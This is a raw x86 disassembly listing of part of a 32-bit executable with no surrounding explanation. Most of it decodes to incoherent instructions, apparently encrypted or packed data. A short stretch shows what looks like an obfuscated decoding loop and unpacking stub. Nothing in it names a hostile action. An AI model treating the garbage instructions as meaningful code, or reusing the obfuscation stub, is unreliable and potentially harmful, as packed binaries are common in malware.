  403190:	push   eax
  403191:	mov    bl,0xda
  403193:	add    ebx,DWORD PTR [eax]
  403195:	aam    0x2e
  403197:	push   ebx
  403198:	in     al,0xb7
  40319a:	mov    BYTE PTR [eax],cl
  40319c:	jg     0x4031a9
  40319e:	daa    
  40319f:	fisub  WORD PTR [esi+0x4e]
  4031a2:	mul    DWORD PTR [eax+0x4da143db]
  4031a8:	dec    esp
  4031a9:	pop    esp
  4031aa:	mov    ebp,0xb3d116c6
  4031af:	lea    ebp,ss:[edi]
  4031b2:	out    dx,al
  4031b3:	sub    eax,0xda1095fa
  4031b8:	adc    dl,BYTE PTR [esi-0x58]
  4031bb:	aad    0x3
  4031bd:	push   edx
  4031be:	jns    0x4031c5
  4031c0:	int    0x31
  4031c2:	aaa    
  4031c3:	push   cs
  4031c4:	cdq    
  4031c5:	sub    BYTE PTR [eax-0x33b0f48c],ah
  4031cb:	iret   
  4031cc:	and    BYTE PTR [edi+0x30d54bda],0x6e
  4031d3:	(bad)  
  4031d6:	add    esi,DWORD PTR [esp+edx*1-0x42de9fe6]
  4031dd:	cwde   
  4031de:	jnp    0x403229
  4031e0:	das    
  4031e1:	jmp    0x7bd7:0x50f09cef
  4031e8:	test   al,0x8f
  4031ea:	daa    
  4031eb:	xchg   ecx,eax
  4031ec:	imul   edi,DWORD PTR [edx-0x3ab1f938],0x7145b7b8
  4031f6:	jb     0x4031b7
  4031f8:	bnd jmp 0x40317c
  4031fb:	call   0xc797:0xebfc052e
  403202:	xchg   esp,eax
  403203:	adc    ah,BYTE PTR [ecx+0x6ed80f89]
  403209:	bound  eax,QWORD PTR [ebp-0x69]
  40320c:	jg     0x4031f5
  40320e:	js     0x40326d
  403210:	imul   esi,edi,0x67
  403213:	pop    esp
  403214:	ret    0x1987
  403217:	std    
  403218:	cmp    eax,0xa8ea6be1
  40321d:	push   es
  40321e:	call   0x16feadf2
  403223:	loope  0x4031d4
  403225:	call   0xa6ab:0x81d20f4d
  40322c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40322d:	outs   dx,DWORD PTR ds:[esi]
  40322e:	mov    edi,0x6cc943f1
  403233:	sub    DWORD PTR [edx],ebx
  403235:	retf   
  403236:	xchg   ebp,eax
  403237:	cwde   
  403238:	xor    DWORD PTR [esi],ecx
  40323a:	pop    esi
  40323b:	jnp    0x403288
  40323d:	mov    eax,ds:0x7b58432d
  403242:	xchg   esp,eax
  403243:	rcr    DWORD PTR [ebp+0x5ae6005],1
  403249:	adc    BYTE PTR [eax-0x63],0x6
  40324d:	dec    ecx
  40324e:	sahf   
  40324f:	pop    ebx
  403250:	enter  0x3822,0x64
  403254:	push   ds
  403255:	sub    eax,esi
  403257:	aaa    
  403258:	jecxz  0x40324a
  40325a:	add    eax,0x7b323fd5
  40325f:	push   ebx
  403260:	push   cs
  403261:	adc    esi,DWORD PTR ds:0xccbcff8f
  403267:	hlt    
  403268:	adc    ch,dl
  40326a:	lds    esi,FWORD PTR [ebx+0x2a]
  40326d:	rol    DWORD PTR [edx],0x23
  403270:	ror    BYTE PTR [edx],0x69
  403273:	jno    0x403201
  403275:	xchg   edx,ecx
  403277:	inc    edi
  403278:	ret    0x94a
  40327b:	fsub   QWORD PTR [ebx]
  40327d:	in     eax,0xde
  40327f:	cmp    DWORD PTR [esi],ecx
  403281:	mov    eax,0x557deda5
  403286:	or     esp,ecx
  403288:	xor    bl,BYTE PTR [edi]
  40328a:	pop    edi
  40328b:	rol    DWORD PTR [ebx+0x5af910ad],cl
  403291:	sbb    DWORD PTR [edi+0x34],ebx
  403294:	lods   al,BYTE PTR ds:[esi]
  403295:	cmp    BYTE PTR [eax],al
  403297:	out    dx,eax
  403298:	dec    ecx
  403299:	push   0xffffffa5
  40329b:	lods   eax,DWORD PTR ds:[esi]
  40329c:	popa   
  40329d:	sub    BYTE PTR [esi],dl
  40329f:	xlat   BYTE PTR ds:[ebx]
  4032a0:	sbb    dl,BYTE PTR [edi-0x2ac82846]
  4032a6:	fcom   st(6)
  4032a8:	out    dx,eax
  4032a9:	xchg   ebp,eax
  4032aa:	rol    DWORD PTR [ebx+0x7d29a65d],1
  4032b0:	pop    eax
  4032b1:	cmp    bh,BYTE PTR [esi]
  4032b3:	test   DWORD PTR [esi],0x589b08be
  4032b9:	imul   esp,DWORD PTR [ecx+0x57ba4290],0xfffffffe
  4032c0:	enter  0x246f,0x41
  4032c4:	out    dx,al
  4032c5:	(bad)  
  4032c6:	outs   dx,DWORD PTR ds:[esi]
  4032c7:	sbb    DWORD PTR [esi+0x44],edx
  4032ca:	cmp    DWORD PTR [ebx-0x4b7c9296],0x71
  4032d1:	xor    DWORD PTR [edx+ebp*4],0xffffffe3
  4032d5:	xchg   ebp,eax
  4032d6:	xor    BYTE PTR [esi+esi*4+0x1b],dh
  4032da:	out    dx,eax
  4032db:	in     al,dx
  4032dc:	imul   esp,DWORD PTR [eax-0x18],0xffffffe2
  4032e0:	inc    esp
  4032e1:	test   al,0x9b
  4032e3:	sar    ebx,1
  4032e5:	or     BYTE PTR [ecx-0x13],bh
  4032e8:	(bad)  
  4032e9:	fst    st(2)
  4032eb:	in     al,0xdd
  4032ed:	sub    WORD PTR [edx+0x74deafc2],cx
  4032f4:	sti    
  4032f5:	add    dl,bh
  4032f7:	add    BYTE PTR [esi-0x3e],ah
  4032fa:	xchg   esp,eax
  4032fb:	adc    DWORD PTR [edx+eiz*8-0x1705290f],edi
  403302:	jno    0x403345
  403304:	xor    bh,BYTE PTR [edx-0x39]
  403307:	cwde   
  403308:	push   ebp
  403309:	mov    ch,ch
  40330b:	adc    DWORD PTR [edi+ecx*2+0x5],0x7c
  403310:	lds    esi,FWORD PTR [ebx-0x12e07577]
  403316:	fist   WORD PTR [esi-0x42]
  403319:	sub    bl,BYTE PTR [eax+0x2f]
  40331c:	test   BYTE PTR [ebx],ch
  40331e:	sti    
  40331f:	js     0x4032f2
  403321:	or     dl,BYTE PTR [ebx+0x6a4c4a71]
  403327:	and    eax,0x95b3455f
  40332c:	cmp    BYTE PTR [eax],ah
  40332e:	fwait
  40332f:	pop    ebx
  403330:	add    eax,0x16b25fd
  403335:	mov    eax,0x41dd5da3
  40333a:	(bad)  [ebx+0x7830b41d]
  403340:	jp     0x40335f
  403342:	les    eax,FWORD PTR [edx+0x444f586f]
  403348:	mov    dl,0xd7
  40334a:	xchg   edx,eax
  40334b:	dec    esp
  40334c:	push   0x65
  40334e:	push   esi
  40334f:	scas   al,BYTE PTR es:[edi]
  403350:	arpl   WORD PTR [ebp-0x58],di
  403353:	sbb    ebx,esi
  403355:	in     al,dx
  403356:	mov    bh,0xce
  403358:	scas   eax,DWORD PTR es:[edi]
  403359:	scas   eax,DWORD PTR es:[edi]
  40335a:	std    
  40335b:	repz popa 
  40335d:	sahf   
  40335e:	(bad)  
  403360:	pop    ebp
  403361:	dec    esi
  403362:	int    0x9b
  403364:	inc    ecx
  403365:	loopne 0x40339c
  403367:	pop    edx
  403368:	xchg   edi,eax
  403369:	or     dh,ah
  40336b:	stc    
  40336c:	push   esp
  40336d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40336e:	pop    edx
  40336f:	and    al,0xbe
  403371:	inc    esp
  403372:	sub    DWORD PTR [edx-0x79],ebp
  403375:	cmp    eax,0x48d9b1be
  40337a:	iret   
  40337b:	out    dx,eax
  40337c:	loope  0x40336e
  40337e:	add    eax,ebx
  403380:	jbe    0x40333d
  403382:	mov    dh,0x61
  403384:	dec    ebx
  403385:	adc    eax,DWORD PTR [ebp+0x15]
  403388:	fcmovne st,st(7)
  40338a:	test   eax,0x6bef885f
  40338f:	xchg   ecx,eax
  403390:	ins    BYTE PTR es:[edi],dx
  403391:	and    edi,DWORD PTR [ecx+0x3e352ba1]
  403397:	es retf 
  403399:	and    BYTE PTR [ecx+0xf08758b],dl
  40339f:	scas   eax,DWORD PTR es:[edi]
  4033a0:	cli    
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033ba:	fadd   st,st(6)
  4033bc:	js     0x4033f8
  4033be:	adc    al,0x70
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x4033e4
  4033c6:	sbb    eax,0x52bfb43d
  4033cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033cc:	adc    DWORD PTR [edi+0x3b],ecx
  4033cf:	sbb    eax,0x5b2c44ac
  4033d4:	fnstsw WORD PTR [eax-0x74813cd9]
  4033da:	pop    ds
  4033db:	mov    ebp,0x74ec3764
  4033e0:	loope  0x4033ef
  4033e2:	and    cl,0x4d
  4033e5:	xor    al,0x12
  4033e7:	jbe    0x403425
  4033e9:	mov    WORD PTR [edx-0x25],cs
  4033ec:	fistp  WORD PTR [edx+ecx*1-0x598e994e]
  4033f3:	nop
  4033f4:	out    0xb,al
  4033f6:	mov    al,0xe1
  4033f8:	ja     0x4033ac
  4033fa:	mov    cl,0xe5
  4033fc:	inc    ebp
  4033fd:	cmp    DWORD PTR [esi],esp
  4033ff:	(bad)  
  403401:	aad    0x3d
  403403:	inc    esp
  403404:	aam    0x33
  403406:	enter  0x39c8,0xd2
  40340a:	xchg   BYTE PTR [edi+0x4c],dl
  40340d:	aaa    
  40340e:	mov    ecx,0x5b3fc3b4
  403413:	pop    ebx
  403414:	clc    
  403415:	inc    esi
  403416:	not    DWORD PTR ds:0xc45734cb
  40341c:	cmp    edi,DWORD PTR [edi+ebx*2-0x250eae3d]
  403423:	push   ds
  403424:	dec    ecx
  403425:	nop
  403426:	test   al,bh
  403428:	aaa    
  403429:	xor    eax,0x9e012511
  40342e:	fistp  QWORD PTR [eax+0x4e]
  403431:	mov    dh,BYTE PTR [eax-0x45cf3553]
  403437:	mov    esi,0x8a079f9f
  40343c:	pop    ebx
  40343d:	and    dl,BYTE PTR [edx-0x605bdf2f]
  403443:	or     eax,0x1af46097
  403448:	pop    es
  403449:	adc    eax,DWORD PTR [esp+ebp*2-0x59]
  40344d:	mov    esp,0xd2a7abb9
  403452:	xor    BYTE PTR [esp+eax*2-0x3dfabca7],bl
  403459:	mov    edi,0xc6d029d3
  40345e:	les    edi,FWORD PTR [esi+0x3da68169]
  403464:	mov    ds:0x47aa7fc6,al
  403469:	cmp    al,0xdb
  40346b:	jg     0x403489
  40346d:	mov    ebp,0x2ad5fdfe
  403472:	pop    es
  403473:	popf   
  403474:	into   
  403475:	mov    al,0x64
  403477:	push   0x5d
  403479:	mov    BYTE PTR [edx],0x62
  40347c:	shl    BYTE PTR [esi],cl
  40347e:	mov    DWORD PTR [eax],edi
  403480:	push   DWORD PTR [edx]
  403482:	bound  ebp,QWORD PTR [ecx+0x1c]
  403485:	or     ah,BYTE PTR ds:0x840b4b22
  40348b:	(bad)  [eax]
  40348d:	jecxz  0x4034d4
  40348f:	pop    esi
  403490:	or     cl,cl
  403492:	jae    0x4034ef
  403494:	hlt    
  403495:	idiv   DWORD PTR [edx+0x97c6418]
  40349b:	lea    ebp,ds:[esi+0x7ab5b4d8]
  4034a2:	rcr    ah,cl
  4034a4:	mov    cl,0xfa
  4034a6:	shl    BYTE PTR [eax-0x7f],0xf4
  4034aa:	lods   eax,DWORD PTR ds:[esi]
  4034ab:	cdq    
  4034ac:	mov    ds:0x1e419758,eax
  4034b1:	dec    ebp
  4034b2:	das    
  4034b3:	jge    0x4034a9
  4034b5:	fbstp  TBYTE PTR [eax+0x681315da]
  4034bb:	fs mov ebp,0xef603546
  4034c1:	sbb    DWORD PTR [esi+0x5bcf679f],esp
  4034c7:	clc    
  4034c8:	add    al,0xd0
  4034ca:	inc    ebp
  4034cb:	cdq    
  4034cc:	out    0xb5,eax
  4034ce:	pop    ss
  4034cf:	in     eax,dx
  4034d0:	(bad)  
  4034d1:	fst    DWORD PTR [edx+0x54602ec9]
  4034d7:	and    bh,0x81
  4034da:	in     eax,0x7a
  4034dc:	in     eax,0x6e
  4034de:	jne    0x403524
  4034e0:	xchg   esp,eax
  4034e1:	mov    edi,0x6f094a9b
  4034e6:	add    dl,ah
  4034e8:	call   0xd6fb:0xf222bb0b
  4034ef:	mov    BYTE PTR [edi+0x50],al
  4034f2:	arpl   WORD PTR [edi+0x7],di
  4034f5:	push   0xffffff8b
  4034f7:	mov    edx,0xaa01bd1e
  4034fc:	mov    eax,DWORD PTR [esi]
  4034fe:	cwde   
  4034ff:	xor    bh,dh
  403501:	cmp    ch,BYTE PTR [esi]
  403503:	sub    DWORD PTR ds:0xe99f856e,0x3d
  40350a:	xchg   esi,eax
  40350b:	aam    0x2d
  40350d:	lods   eax,DWORD PTR ds:[esi]
  40350e:	gs sahf 
  403510:	pop    es
  403511:	cwde   
  403512:	jmp    0x403542
  403514:	jmp    0xc56b485d
  403519:	xor    ah,ch
  40351b:	leave  
  40351c:	hlt    
  40351d:	retf   
  40351e:	pmulhw mm5,QWORD PTR [ecx-0x6a]
  403522:	mov    al,ds:0x34535444
  403527:	gs cmp eax,0x4b249ea2
  40352d:	lea    ebp,[eax+0x43]
  403530:	leave  
  403531:	and    DWORD PTR [edi-0x60a9ea4a],ebx
  403537:	gs fcomi st,st(6)
  40353a:	es and eax,0x300f8cd3
  403540:	imul   esp,DWORD PTR [edi],0xd1098b4a
  403546:	out    0xdb,al
  403548:	cmp    BYTE PTR [edi],cl
  40354a:	sbb    esp,DWORD PTR [ebx+0xaa258c5]
  403550:	fistp  QWORD PTR [ebx+0x735854be]
  403556:	iret   
  403557:	inc    esp
  403558:	gs in  eax,dx
  40355a:	psrlw  mm7,QWORD PTR [ecx+0x2b]
  40355e:	jbe    0x4035cc
  403560:	inc    ecx
  403561:	(bad)  
  403563:	mov    ebx,DWORD PTR [ecx]
  403565:	outs   dx,BYTE PTR ds:[esi]
  403566:	sbb    DWORD PTR [ecx],ebp
  403568:	arpl   WORD PTR [esi],sp
  40356a:	adc    al,0xf8
  40356c:	es pop ecx
  40356e:	loopne 0x40352a
  403570:	daa    
  403571:	sub    edx,0xd1eed2c8
  403577:	jae    0x403583
  403579:	lahf   
  40357a:	imul   edi,DWORD PTR [edi],0xe4f0ce34
  403580:	popa   
  403581:	int    0xbb
  403583:	xchg   DWORD PTR ds:0xfa4784c8,esi
  403589:	cmp    cl,cl
  40358b:	adc    esi,DWORD PTR [esi+esi*2-0x9]
  40358f:	adc    BYTE PTR [edi+0x78],bh
  403592:	ins    BYTE PTR es:[edi],dx
  403593:	stos   BYTE PTR es:[edi],al
  403594:	xchg   BYTE PTR [esi-0x3de552a2],bh
  40359a:	mov    bl,0xc4
  40359c:	bound  esp,QWORD PTR [ebx]
  40359e:	and    al,0xf9
  4035a0:	inc    edx
  4035a1:	sub    al,0x21
  4035a3:	neg    al
  4035a5:	gs cld 
  4035a7:	fadd   DWORD PTR gs:[edx+ecx*1]
  4035ab:	xor    ebx,DWORD PTR [ebx+0x5d]
  4035ae:	and    edi,DWORD PTR [edi]
  4035b0:	jp     0x403579
  4035b2:	cmp    DWORD PTR [ecx+0x3269761f],ecx
  4035b8:	int    0x55
  4035ba:	mov    ch,0x8a
  4035bc:	gs adc cl,bh
  4035bf:	fwait
  4035c0:	in     eax,dx
  4035c1:	mov    esi,0xb549f80b
  4035c6:	js     0x4035db
  4035c8:	dec    edx
  4035c9:	les    ecx,FWORD PTR [edi+ebp*8+0x31c2f72]
  4035d0:	jo     0x403568
  4035d2:	div    DWORD PTR [edx]
  4035d4:	mov    es,ebx
  4035d6:	mov    ds:0xd899745d,eax
  4035db:	dec    ebp
  4035dc:	pop    es
  4035dd:	stos   BYTE PTR es:[edi],al
  4035de:	xchg   ebp,eax
  4035df:	outs   dx,DWORD PTR ds:[esi]
  4035e0:	push   ebp
  4035e1:	aaa    
  4035e2:	jmp    0xef31:0x3da7ea17
  4035e9:	inc    esp
  4035ea:	cwde   
  4035eb:	sub    esp,DWORD PTR [eax-0x6]
  4035ee:	push   ecx
  4035ef:	adc    BYTE PTR [edx+eiz*4+0x2a3f963d],dl
  4035f6:	push   ss
  4035f7:	aad    0x5c
  4035f9:	mov    ah,0x32
  4035fb:	and    ebp,DWORD PTR ds:0xe2097768
  403601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403602:	jne    0x403672
  403604:	leave  
  403605:	mov    eax,DWORD PTR [eax+0x1f]
  403608:	in     eax,dx
  403609:	push   ds
  40360a:	(bad)  
  40360b:	adc    ecx,edi
  40360d:	lods   eax,DWORD PTR ds:[esi]
  40360e:	fistp  WORD PTR [edx+0x5]
  403611:	arpl   WORD PTR [edi+0x75cd7159],cx
  403617:	fsub   DWORD PTR [edx]
  403619:	sbb    ebx,DWORD PTR [edi+0x1d]
  40361c:	pop    esp
  40361d:	in     al,dx
  40361e:	xchg   esp,eax
  40361f:	inc    esp
  403620:	jo     0x40366a
  403622:	add    DWORD PTR [edi+0x61],ebp
  403625:	push   cs
  403626:	dec    eax
  403627:	retf   0x3677
  40362a:	xchg   DWORD PTR [esi-0x31],esp
  40362d:	adc    edx,ebp
  40362f:	push   es
  403630:	sbb    al,0xe1
  403632:	sti    
  403633:	jecxz  0x403681
  403635:	mov    dh,0xe6
  403637:	xchg   edi,eax
  403638:	sbb    ah,BYTE PTR [ebp+0x4ab95f4e]
  40363e:	mov    dl,0xa4
  403640:	je     0x403625
  403642:	pushf  
  403643:	dec    ebx
  403644:	fst    QWORD PTR [ecx+ebx*2-0x14c489fb]
  40364b:	loope  0x4035d8
  40364d:	mov    ecx,0x2332e17d
  403652:	leave  
  403653:	and    eax,0x96862dd4
  403658:	cmp    eax,DWORD PTR [edi-0x2203459f]
  40365e:	js     0x40360b
  403660:	cdq    
  403661:	sub    al,BYTE PTR [ecx]
  403663:	push   ecx
  403664:	loop   0x4035f6
  403666:	les    edi,FWORD PTR [edi]
  403668:	jle    0x403691
  40366a:	dec    ecx
  40366b:	adc    DWORD PTR [esi-0x905c934],0x6
  403672:	mov    dh,0xff
  403674:	sbb    bh,BYTE PTR [edi-0xe]
  403677:	sbb    DWORD PTR [ebp-0x1cf54059],0xa48c25b2
  403681:	in     al,dx
  403682:	ret    0x812a
  403685:	sbb    BYTE PTR [ebx-0x76],ch
  403688:	test   BYTE PTR [ebx],al
  40368a:	pushf  
  40368b:	jb     0x4036bf
  40368d:	add    BYTE PTR [eax+0x458b3704],cl
  403693:	cld    
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fced,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fced,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fced,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e2d7
  4036fc:	cmp    DWORD PTR ds:0x42fced,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fced
  403711:	dec    eax
  403712:	mov    ds:0x42fced,eax
  403717:	mov    eax,ds:0x42fced
  40371c:	dec    eax
  40371d:	mov    ds:0x42fced,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e6f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e6f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e713,0x42e11c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fd7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e124,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e70f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    ecx,edx
  4037a2:	xchg   DWORD PTR [edx-0x2c],ecx
  4037a5:	js     0x4037b8
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0xaa70707d
  4037ae:	dec    edi
  4037af:	dec    edi
  4037b0:	sbb    eax,DWORD PTR [eax]
  4037b2:	call   0x7621:0x8a944e56
  4037b9:	cs push edx
  4037bb:	xor    al,bl
  4037bd:	or     dh,BYTE PTR [esi-0x9]
  4037c0:	into   
  4037c1:	add    dh,dh
  4037c3:	shl    BYTE PTR ds:0xa0b53c78,1
  4037c9:	sub    BYTE PTR [ebx-0x70e0f1b4],cl
  4037cf:	push   ebp
  4037d0:	mov    edi,0xd8c01c13
  4037d5:	rcr    DWORD PTR [ecx],1
  4037d7:	push   edi
  4037d8:	stos   BYTE PTR es:[edi],al
  4037d9:	fs cmp al,0x7c
  4037dc:	fmul   QWORD PTR [edx-0x34]
  4037df:	xor    al,0x8f
  4037e1:	ins    DWORD PTR es:[edi],dx
  4037e2:	mov    es,edi
  4037e4:	mov    cl,0xae
  4037e6:	dec    ebp
  4037e7:	out    dx,al
  4037e8:	push   es
  4037e9:	je     0x40377d
  4037eb:	cld    
  4037ec:	lds    ebp,FWORD PTR [edx-0x60]
  4037ef:	jle    0x403788
  4037f1:	xchg   DWORD PTR [ebp-0x904527e],edx
  4037f7:	ins    BYTE PTR es:[edi],dx
  4037f8:	outs   dx,DWORD PTR ds:[esi]
  4037f9:	dec    ebp
  4037fa:	clc    
  4037fb:	loop   0x4037e3
  4037fd:	sub    eax,0xc3799a54
  403802:	sahf   
  403803:	iret   
  403804:	loopne 0x40380b
  403806:	jl     0x4037e3
  403808:	test   DWORD PTR cs:[esi+0x2b],ecx
  40380c:	adc    esp,esp
  40380e:	pop    esp
  40380f:	add    BYTE PTR [ecx],bh
  403811:	aad    0xc0
  403813:	adc    al,0xf1
  403815:	sbb    BYTE PTR [edx+0x20],dl
  403818:	punpckhwd mm6,QWORD PTR [edi+0x374ff75a]
  40381f:	jne    0x4037a2
  403821:	jb     0x403811
  403823:	fcmovb st,st(0)
  403825:	inc    edi
  403826:	mov    al,0xae
  403828:	mov    DWORD PTR [edx+0x54f9ce46],edi
  40382e:	lea    eax,[eax]
  403830:	add    DWORD PTR [ebx],edx
  403832:	mov    edi,0x2074409b
  403837:	inc    esi
  403838:	imul   ecx,DWORD PTR [esi],0xfffffff8
  40383b:	aam    0xf4
  40383d:	sbb    eax,0x91d491b
  403842:	cs inc esp
  403844:	mov    dh,0x8b
  403846:	clc    
  403847:	mov    dl,0xe0
  40384a:	aad    0x11
  40384c:	and    esi,DWORD PTR [edx]
  40384e:	test   DWORD PTR [ebx],edx
  403850:	fisubr DWORD PTR [ecx-0x1e076ae6]
  403856:	jp     0x4038ae
  403858:	call   0xd63098de
  40385d:	cld    
  40385e:	mov    BYTE PTR [ecx],cl
  403860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403861:	cmp    ebp,ecx
  403863:	xchg   bl,dh
  403865:	pop    ss
  403866:	sbb    DWORD PTR [edi+0x635c16e0],esp
  40386c:	mov    ecx,0x65dd30ed
  403871:	cvtpi2ps xmm7,QWORD PTR [ebx+0x18fb07e1]
  403878:	jp     0x40389e
  40387a:	xchg   edx,eax
  40387b:	inc    edi
  40387c:	scas   al,BYTE PTR es:[edi]
  40387d:	mov    DWORD PTR [eax+0x572918a1],eax
  403883:	stos   DWORD PTR es:[edi],eax
  403884:	lods   al,BYTE PTR ds:[esi]
  403885:	jo     0x403881
  403887:	dec    BYTE PTR [ebx-0x1d]
  40388a:	inc    ecx
  40388b:	jp     0x403821
  40388d:	pusha  
  40388e:	lahf   
  40388f:	ficom  DWORD PTR [ecx+0x14525f29]
  403895:	addr16 mov es,esp
  403898:	cmc    
  403899:	scas   al,BYTE PTR es:[edi]
  40389a:	dec    eax
  40389b:	or     ebx,edi
  40389d:	mov    BYTE PTR [ecx-0x24d6dc56],0x18
  4038a4:	jecxz  0x4038f0
  4038a6:	push   esi
  4038a7:	inc    esi
  4038a8:	sar    esi,1
  4038aa:	push   esi
  4038ab:	out    dx,eax
  4038ac:	cdq    
  4038ad:	or     bl,cl
  4038af:	xchg   esp,eax
  4038b0:	fwait
  4038b1:	loop   0x403879
  4038b3:	out    dx,al
  4038b4:	mov    DWORD PTR [esi+0x70],edx
  4038b7:	mov    bl,BYTE PTR [ecx-0xa]
  4038ba:	sbb    eax,0x4bcfdef3
  4038bf:	sub    BYTE PTR [eax],0xa9
  4038c2:	adc    al,0x5f
  4038c4:	push   esp
  4038c5:	add    eax,0xa03afa9e
  4038ca:	xor    BYTE PTR [esi+0x45aeab78],bl
  4038d0:	in     al,0x70
  4038d2:	retf   
  4038d3:	dec    ecx
  4038d4:	mov    eax,0xcd79cc08
  4038d9:	inc    ecx
  4038da:	lock rol BYTE PTR [ecx],1
  4038dd:	adc    ah,BYTE PTR [ecx-0x50]
  4038e0:	xchg   ebp,eax
  4038e1:	retf   
  4038e2:	mov    al,ds:0x79ad9253
  4038e7:	clc    
  4038e8:	or     eax,0x8e1b4e34
  4038ed:	inc    ebx
  4038ee:	mov    edx,0xaca252d2
  4038f3:	and    ecx,DWORD PTR [esi-0x69ee024a]
  4038f9:	and    al,0x91
  4038fb:	(bad)  
  4038fc:	fucomp st(3)
  4038fe:	dec    ecx
  4038ff:	ins    DWORD PTR es:[edi],dx
  403900:	dec    edx
  403901:	mov    ch,0xb9
  403903:	push   ebx
  403904:	mov    dh,0x9e
  403906:	mov    al,0xf9
  403908:	dec    ecx
  403909:	push   ds
  40390a:	aaa    
  40390b:	je     0x4038d1
  40390d:	jae    0x40397a
  40390f:	daa    
  403910:	push   ecx
  403911:	inc    eax
  403912:	mov    ah,0xf0
  403914:	iret   
  403915:	xchg   DWORD PTR [esi+0x41],esi
  403918:	shr    BYTE PTR [ebx-0x7ec83153],1
  40391e:	mov    edx,0x34bc0c1c
  403923:	call   0xe612:0xef942fff
  40392a:	sbb    al,0x87
  40392c:	add    DWORD PTR [edx+ecx*1+0x7e0612ad],ebx
  403933:	xlat   BYTE PTR ds:[ebx]
  403934:	popa   
  403935:	imul   eax,DWORD PTR [ecx-0x4a],0xffffff91
  403939:	jno    0x4038e1
  40393b:	jne    0x4039a1
  40393d:	stos   DWORD PTR es:[edi],eax
  40393e:	xchg   esp,ecx
  403940:	fiadd  DWORD PTR [esi+0x6b]
  403943:	xchg   dl,dl
  403945:	sbb    DWORD PTR ss:[ebx+0x31],eax
  403949:	xor    esi,DWORD PTR [ebx-0x209093d8]
  40394f:	jbe    0x40394f
  403951:	adc    BYTE PTR [esi+0x15],0xb2
  403955:	adc    ebp,ebp
  403957:	push   ecx
  403958:	cmp    DWORD PTR [eax+0x1217fbc],esi
  40395e:	add    DWORD PTR [edx+edx*1],edx
  403961:	lods   eax,DWORD PTR ds:[esi]
  403962:	sub    eax,0x4cae1bf
  403967:	pop    DWORD PTR [edi]
  403969:	adc    ch,BYTE PTR [ecx-0x14]
  40396c:	imul   esi,eax,0x67
  40396f:	ror    DWORD PTR [ebx+0x8004193],1
  403975:	bnd jmp 0x4039dd
  403978:	call   0x8368:0x8ce090a2
  40397f:	pop    eax
  403980:	retf   
  403981:	pop    ebp
  403982:	ror    edi,1
  403984:	cwde   
  403985:	sbb    eax,0x89cbe7cf
  40398a:	inc    ebp
  40398b:	pop    edx
  40398c:	push   esp
  40398d:	cmp    eax,0x3fb66513
  403992:	mov    bl,0xea
  403994:	pop    edi
  403995:	outs   dx,DWORD PTR ds:[esi]
  403996:	xor    BYTE PTR [edi],bh
  403998:	dec    eax
  403999:	add    edi,ebx
  40399b:	mov    ch,BYTE PTR [esi-0x4d]
  40399e:	pushf  
  40399f:	push   DWORD PTR [edi-0xe]
  4039a2:	jecxz  0x403945
  4039a4:	pop    edx
  4039a5:	retf   0x3221
  4039a8:	sar    esp,1
  4039aa:	es push cs
  4039ac:	es retf 0x992d
  4039b0:	mov    edi,DWORD PTR [ebx]
  4039b2:	add    dh,BYTE PTR [ebx-0x17]
  4039b5:	sbb    ah,bh
  4039b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039b8:	fmul   QWORD PTR [ebx+0xe]
  4039bb:	cdq    
  4039bc:	pcmpeqb mm0,mm4
  4039bf:	scas   al,BYTE PTR es:[edi]
  4039c0:	repnz adc eax,0x539e8382
  4039c6:	cdq    
  4039c7:	xchg   BYTE PTR [ebx+0x35],bl
